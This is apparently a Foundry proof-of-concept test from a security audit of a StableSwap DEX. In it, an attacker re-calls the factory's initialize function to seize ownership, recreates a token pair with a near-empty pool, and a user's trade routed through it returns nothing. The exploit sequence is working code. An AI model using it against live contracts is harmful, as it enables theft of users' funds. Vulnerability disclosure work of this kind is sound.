// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {StableSwapLP} from "../contracts/stableSwap/StableSwapLP.sol";
import {StableSwapFactory} from "../contracts/stableSwap/StableSwapFactory.sol";
import {StableSwapLPFactory} from "../contracts/stableSwap/StableSwapLPFactory.sol";
import {StableSwapTwoPool} from "../contracts/stableSwap/plain-pools/StableSwapTwoPool.sol";
import {StableSwapThreePool} from "../contracts/stableSwap/plain-pools/StableSwapThreePool.sol";
import {IStableSwapDeployer} from "../contracts/interfaces/IStableSwapDeployer.sol";
import {StableSwapTwoPoolDeployer} from "../contracts/stableSwap/StableSwapTwoPoolDeployer.sol";
import {StableSwapThreePoolDeployer} from "../contracts/stableSwap/StableSwapThreePoolDeployer.sol";
import {StableSwapInfo} from "../contracts/stableSwap/utils/StableSwapInfo.sol";
import {StableSwapTwoPoolInfo} from "../contracts/stableSwap/utils/StableSwapTwoPoolInfo.sol";
import {StableSwapThreePoolInfo} from "../contracts/stableSwap/utils/StableSwapThreePoolInfo.sol";
import {IStableSwapLPFactory} from "../contracts/interfaces/IStableSwapLPFactory.sol";
import {StableSwapRouter} from "../contracts/StableSwapRouter.sol";
import {IStableSwapInfo} from "../contracts/interfaces/IStableSwapInfo.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    uint8 public _decimals;

    constructor(
        string memory name,
        string memory symbol,
        uint8 newDecimals
    ) ERC20(name, symbol) {
        _decimals = newDecimals;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }
}

contract POC is Test {
    address public tokenA;
    address public tokenB;

    address public owner = makeAddr("owner");
    uint256 public A = 1000; // from the tests
    uint256 public fee = 4_000_000; // from the tests
    uint256 public admin_fee = 5_000_000_000; // from the tests
    address public actor = makeAddr("actor"); // malicious actor
    address public user = makeAddr("user"); // normal user

    StableSwapLPFactory public lpFactory;
    StableSwapTwoPoolDeployer public twoPoolDeployer;
    StableSwapThreePoolDeployer public threePoolDeployer;
    address public liquidityProvider = makeAddr("liquidityProvider");
    StableSwapFactory public factory;
    StableSwapThreePoolInfo public threePoolInfo;
    StableSwapTwoPoolInfo public twoPoolInfo;
    StableSwapInfo public poolInfo;
    StableSwapRouter public router;

    function setUp() public {
        vm.startPrank(owner);
        lpFactory = new StableSwapLPFactory();
        twoPoolDeployer = new StableSwapTwoPoolDeployer();
        threePoolDeployer = new StableSwapThreePoolDeployer();
        factory = new StableSwapFactory();
        factory.initialize(
            IStableSwapLPFactory(address(lpFactory)),
            IStableSwapDeployer(address(twoPoolDeployer)),
            IStableSwapDeployer(address(threePoolDeployer)),
            owner
        );
        lpFactory.transferOwnership(address(factory));
        twoPoolDeployer.transferOwnership(address(factory));
        threePoolDeployer.transferOwnership(address(factory));

        threePoolInfo = new StableSwapThreePoolInfo();
        twoPoolInfo = new StableSwapTwoPoolInfo();
        poolInfo = new StableSwapInfo(
            IStableSwapInfo(address(twoPoolInfo)),
            IStableSwapInfo(address(threePoolInfo))
        );
        router = new StableSwapRouter(address(factory), address(poolInfo));

        tokenA = address(new MockERC20("TOKENA", "TOKENA", 18));
        tokenB = address(new MockERC20("TOKENB", "TOKENB", 18));
        factory.createSwapPair(tokenA, tokenB, A, fee, admin_fee);
        address swapContract = factory.getPairInfo(tokenA, tokenB).swapContract;
        console.log("Pool contract address first time :", swapContract);
        _addLiquidity(StableSwapTwoPool(swapContract), 1_000_000 ether);
        vm.stopPrank();
        vm.warp(block.timestamp + 1);
    }

    function test_POC() public {
        // malicious actor frontruns user
        vm.startPrank(actor);
        factory.initialize(
            IStableSwapLPFactory(address(lpFactory)),
            IStableSwapDeployer(address(twoPoolDeployer)),
            IStableSwapDeployer(address(threePoolDeployer)),
            actor
        );
        // uses identical parameters to override the existing state
        factory.createSwapPair(tokenA, tokenB, A, fee, admin_fee);
        address swapContract = factory.getPairInfo(tokenA, tokenB).swapContract;
        console.log("Pool contract address second time :", swapContract);
        _addLiquidity(StableSwapTwoPool(swapContract), 1);
        vm.stopPrank();

        // user does a normal trade
        uint256 amountToTrade = 1000 ether;
        deal(tokenA, user, amountToTrade);

        vm.startPrank(user);
        IERC20(tokenA).approve(address(router), amountToTrade);
        address[] memory coins = new address[](2);
        coins[0] = tokenA;
        coins[1] = tokenB;
        uint256[] memory flag = new uint256[](1);
        flag[0] = 2;
        router.exactInputStableSwap(coins, flag, amountToTrade, 0, user);
        vm.stopPrank();

        uint256 userBalOut = IERC20(tokenB).balanceOf(user);
        console.log("TokenB balance of user :", userBalOut);
        assertEq(userBalOut, 0);
    }

    function _addLiquidity(
        StableSwapTwoPool _twoPool,
        uint256 liquidityAmount
    ) private {
        address _tokenA = _twoPool.coins(0);
        address _tokenB = _twoPool.coins(1);
        deal(_tokenA, liquidityProvider, liquidityAmount);
        deal(_tokenB, liquidityProvider, liquidityAmount);

        vm.startPrank(liquidityProvider);
        IERC20(_tokenA).approve(address(_twoPool), liquidityAmount);
        IERC20(_tokenB).approve(address(_twoPool), liquidityAmount);
        _twoPool.add_liquidity([liquidityAmount, liquidityAmount], 0);
        vm.stopPrank();
    }
}
